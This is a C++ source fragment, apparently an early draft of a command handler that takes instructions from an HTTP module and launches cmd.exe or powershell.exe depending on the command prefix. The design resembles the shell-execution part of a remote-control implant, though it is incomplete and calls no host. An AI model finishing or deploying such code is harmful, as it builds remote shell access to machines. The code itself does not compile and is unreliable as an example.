#include <string>
#include <mutex>
#include "xhttp.h"
#include <iostream>

namespace command{
char cmdProc[] = "cmd.exe";
char psProc[] = "powershell.exe";
std::mutex mtx;
bool procopen = false;
std::string aa = xhttp::cmdString;




// If mutex is not create and runningProc is false then call createProc() and then call sendCMD()

// If runningProc is true and mutex is created then call sendCMD()

// Else "Something weird happened"


// createProc and get PID

// Use openProc to access the created process 






int createProc() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // CreateProcessA function call goes here

    if (CreateProcessA(
        "C:\\Path\\To\\Your\\Executable.exe",   // path to the executable
        NULL,                                   // command line
        NULL,                                   // process security attributes
        NULL,                                   // thread security attributes
        FALSE,                                  // handle inheritance flag
        0,                                      // creation flags
        NULL,                                   // environment block
        NULL,                                   // starting directory
        &si,                                    // STARTUPINFO pointer
        &pi                                     // PROCESS_INFORMATION pointer
    )) {
        // Process created successfully
        std::cout << "Process ID: " << pi.dwProcessId << std::endl;

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        // Error handling if CreateProcessA fails
        std::cerr << "CreateProcessA failed: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}

void parseCmd(const std::string& aa) {
    if (!procopen) {
        if (mtx.try_lock()) { // Attempt to lock the mutex

        // aa needs to equal cmdResponse from xhttp
            std::lock_guard<std::mutex> lock(mtx, std::adopt_lock);
            std::cerr << "Parsing2: " << xhttp::cmdResponse << std::endl;
            if (xhttp::cmdResponse.substr(0, 3) == "cmd") {
                createProc(cmdProc);
            } else if (xhttp::cmdResponse.substr(0, 2) == "ps") {
                createProc(psProc);
            } else {
                std::cerr << "Not a valid command" << std::endl;
            }
            return;
        } else {
            std::cout << "mtx open" << std::endl;
            return;
        }
    }
}




}